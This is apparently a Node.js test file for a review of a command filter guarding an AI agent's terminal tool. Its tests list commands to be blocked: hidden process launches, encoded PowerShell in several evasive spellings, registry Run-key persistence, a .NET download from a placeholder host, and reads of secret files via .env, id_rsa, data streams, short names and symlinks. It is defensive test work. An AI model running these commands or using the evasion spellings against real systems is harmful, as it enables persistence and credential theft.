// Findings of the review of 2.5.0 (terminal): more than one line, paths from the root of the drive, commands that
// start other programs, encoded PowerShell, the registry, .NET downloads, git output with file contents, secret names.
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { classifyCommand, isSecretFile, createTerminal } = require('../terminal-core');

const W = { root: 'C:\\proj', platform: 'win32' };
const L = { root: '/home/u/proj', platform: 'linux' };

test('a command with a second line is refused, also when the first line only looks', () => {
  for (const c of ['git status\nStart-Process calc', 'git log\r\nnode evil.js', 'dir\nrm -rf x']) {
    assert.equal(classifyCommand(c, W).blocked, true, JSON.stringify(c));
  }
});

test('Windows: paths from the root of the drive are outside the project; switches are not paths', () => {
  for (const c of ['dir \\Users', 'tree \\', 'Get-Content \\Users\\x\\secret.txt', 'type /Windows/win.ini']) {
    assert.equal(classifyCommand(c, W).blocked, true, c);
  }
  for (const c of ['dir /s', 'dir /b', 'tree /f', 'dir src', 'Get-ChildItem C:\\proj\\src']) {
    assert.equal(classifyCommand(c, W).blocked, false, c);
  }
  assert.equal(classifyCommand('dir /s', W).readOnly, true);
  assert.equal(classifyCommand('dir /Users', W).readOnly, false); // asked, not run by itself
  for (const c of ['msbuild /nologo', 'robocopy src dst /purge', 'dotnet build /p:Configuration=Release']) assert.equal(classifyCommand(c, W).blocked, false, c);
});

test('commands that start other programs out of sight, encoded PowerShell, the registry are refused', () => {
  for (const c of ['cmd /c start calc', '$j = Start-Job { calc }', 'saps calc', 'Invoke-CimMethod Win32_Process -MethodName Create -Arguments @{CommandLine="calc"}',
    'powershell -EncodedC SQBFAFgA', 'powershell -ec SQBFAFgA', "& ([scriptblock]::Create('calc'))",
    'New-ItemProperty -Path Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name x -Value y',
    'Set-ItemProperty HKCU:\\Software\\X -Name a -Value b', '(New-Object Net.WebClient).DownloadString("https://x.example/a.ps1")']) {
    assert.equal(classifyCommand(c, W).blocked, true, c);
  }
  assert.equal(classifyCommand('powershell -NoProfile -File total.ps1', W).blocked, false);
});

test('the internet: .NET downloads count, a folder named .ssh does not', () => {
  assert.equal(classifyCommand('$c = New-Object System.Net.WebClient', W).network, true);
  assert.equal(classifyCommand('$c = New-Object System.Net.WebClient', { ...W, offline: true }).blocked, true);
  assert.equal(classifyCommand('Get-ChildItem ./.ssh', W).network, false);
  assert.equal(classifyCommand('ssh user@host', L).network, true);
});

test('git output with file contents is asked, not run by itself', () => {
  for (const c of ['git show HEAD:.env', 'git log -p', 'git log --patch', 'git show HEAD:src/a.js']) {
    assert.ok(!classifyCommand(c, L).readOnly, c);
  }
  assert.equal(classifyCommand('git log --oneline -5', L).readOnly, true);
  assert.equal(classifyCommand('git show --stat HEAD', L).readOnly, true);
});

test('other names of secret files: streams and short names (file paths of read_file and write_file)', () => {
  const { oddFileName } = require('../terminal-core');
  for (const f of ['.env::$DATA', 'config/.env:secret', 'ENV~1', 'SECRET~2.JSO']) assert.equal(oddFileName(f), true, f);
  assert.equal(oddFileName('C:/proj/readme.md'), false);
  assert.equal(oddFileName('src/app.js'), false);
});

test('a link with an innocent name to a secret file is not read', async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'starkllm-review-'));
  fs.writeFileSync(path.join(root, '.env'), 'KEY=x');
  try { fs.symlinkSync(path.join(root, '.env'), path.join(root, 'notes.txt')); } catch (e) { return; }
  const term = createTerminal({ root, fs, run: async () => ({ code: 0, output: '' }) });
  const r = await term.call('read_file', { path: 'notes.txt' }, { ask: async () => ({ ok: true }) });
  assert.ok(!r.output);
  assert.equal(r.step.action, 'secret');
});

test('commands that name a file with secrets are refused, also with a yes', () => {
  for (const c of ['type .env', 'Get-Content (Join-Path $PWD ".env")', 'cat config/.env.local', 'copy id_rsa x.txt', 'Get-Content certs\server.key']) {
    assert.equal(classifyCommand(c, W).blocked, true, c);
  }
  for (const c of ['type .env.example', 'type README.md', 'dir']) assert.equal(classifyCommand(c, W).blocked, false, c);
});

test('everyday commands with colons, tildes and addresses are not refused', () => {
  for (const c of ['npm run test:unit', 'git diff HEAD~1', 'git log HEAD~3 --oneline', 'git show HEAD:src/app.js', 'pytest tests/test_a.py::test_x',
    'dotnet build /p:Configuration=Release', 'curl https://example.com', 'git clone https://example.com/r.git', 'docker run -p 8080:80 x']) {
    assert.equal(classifyCommand(c, W).blocked, false, c);
  }
  for (const c of ['git show HEAD:.env', 'type .env::$DATA', 'Get-Content .env:secret']) assert.equal(classifyCommand(c, W).blocked, true, c);
});

test('encoded PowerShell in every spelling', () => {
  for (const c of ['powershell /enc SQBFAFgA', 'powershell \u2013enc SQBFAFgA', 'powershell -EncodedArguments x', 'powershell -enc:SQBFAFgA', 'pwsh -e SQBFAFgA']) {
    assert.equal(classifyCommand(c, W).blocked, true, c);
  }
  assert.equal(classifyCommand('powershell -NoProfile -Command "Get-Content a.txt -Encoding utf8"', W).blocked, false);
});
